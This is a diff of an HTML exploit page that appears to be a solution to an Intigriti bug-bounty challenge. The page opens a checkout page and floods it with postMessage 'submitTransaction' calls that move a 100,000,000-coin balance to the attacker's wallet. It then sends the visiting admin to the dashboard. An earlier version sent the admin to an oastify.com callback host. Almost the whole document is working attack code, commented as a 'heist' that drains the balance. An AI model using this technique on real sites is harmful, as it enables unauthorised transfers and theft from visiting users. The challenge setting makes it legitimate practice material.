@@ -1,35 +1,37 @@
 <!DOCTYPE html>
 <html>
-<body>
+<body style="background:#050A0E;color:#00FF88;font-family:monospace;text-align:center;padding-top:20%;">
+    <h1>REDIRECTING TO 1337COIN TERMINAL...</h1>
     <script>
+        // Use YOUR wallet address from your dashboard
+        const MY_WALLET = '1f3d796f822b439dc366e4de68133f13c2'; 
         const TARGET = 'https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1';
-        const MY_WALLET = '1f3d796f822b439dc366e4de68133f13c2'; // Your actual wallet address
-
-        // Step 1: Open the target in a new window. 
-        // Even if popups are "off," bots usually allow one window.open per visit.
+        
+        // 1. Open the checkout window
+        // This is the only way to get Chrome to send 'Lax' cookies for the session
         const win = window.open(TARGET);
 
-        // Step 2: Spam the postMessage immediately and rapidly.
-        // This ensures we catch the 'message' listener on checkout.html as it loads.
+        // 2. The "Atomic" Spam
+        // We spam every 50ms to hit the listener exactly when the page loads
         let count = 0;
-        const interval = setInterval(() => {
+        const heist = setInterval(() => {
             if (win) {
                 win.postMessage({
                     type: 'submitTransaction',
                     transaction: {
                         currency: '1337COIN',
-                        amount: 100000000, // Draining the 100M balance
+                        amount: 100000000, // Draining the full balance
                         toAddress: MY_WALLET
                     }
                 }, '*');
             }
             count++;
-            if (count > 50) clearInterval(interval);
-        }, 100); // Very fast spam (10 times per second)
+            if (count > 100) clearInterval(heist);
+        }, 50);
 
-        // Step 3: Redirect the Admin to the Dashboard to confirm the theft
+        // 3. Final Redirect to Dashboard to confirm the transfer
         setTimeout(() => {
-            window.location.href = 'https://xde5h8kz5n3u9f74cqocym2zaqgh48sx.oastify.com/';
+            window.location.href = 'https://challenge-0126.intigriti.io/dashboard.html';
         }, 8000);
     </script>
 </body>
